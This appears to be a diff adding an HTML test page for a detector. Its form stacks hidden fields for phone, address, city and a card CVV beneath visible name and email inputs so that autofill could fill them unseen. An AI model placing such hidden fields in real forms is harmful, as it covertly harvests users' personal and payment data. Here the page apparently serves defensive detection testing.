@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Input Overlap</title>
+</head>
+
+<body>
+  <h3>This form overlaps hidden inputs underneath visible inputs.</h3>
+
+  <form action="https://httpbin.org/post" method="post">
+    <p style="position: absolute; top: 80px; right: 200;">
+      <label for="name">Name</label><br>
+      <input id="name" name="name" type="text" placeholder="Your Name">
+    </p>
+    <p>
+      <label for="email">Email</label><br>
+      <input id="email" name="email" type="email" placeholder="Your Email">
+    </p>
+    <p style="position: absolute; top: 80px; right: 200; z-index: -1;">
+      <input id="phone" name="phone" type="text" placeholder="">
+    </p>
+    <p style="position: absolute; top: 80px; right: 200; z-index: -1;">
+      <input id="organization" name="organization" type="text" placeholder="Your Organization">
+    </p>
+    <p style="position: absolute; top: 80px; right: 200; z-index: -1;">
+      <input id="address" name="address" type="text" placeholder="Your Address">
+    </p>
+    <p style="position: absolute; top: 80px; right: 200; z-index: -1;">
+      <input id="postal" name="postal" type="text" placeholder="Your Postal Code">
+    </p>
+    <p style="position: absolute; top: 80px; right: 200; z-index: -1;">
+      <input id="city" name="city" type="text" placeholder="Your City">
+    </p>
+    <p style="position: absolute; top: 80px; right: 200; z-index: -1;">
+      <input type="text" id="cc_cvv" name="cc_cvv">
+    </p>
+    <p style="position: absolute; top: 130px; right: 200; z-index: -1;">
+      <input type="submit" value="Submit" style="z-index: 20;">
+    </p>
+  </form>
+  <!-- <script type='module'>
+    import { detect_script } from './detect_script.js';
+    detect_script();
+  </script> -->
+</body>
+
+</html>
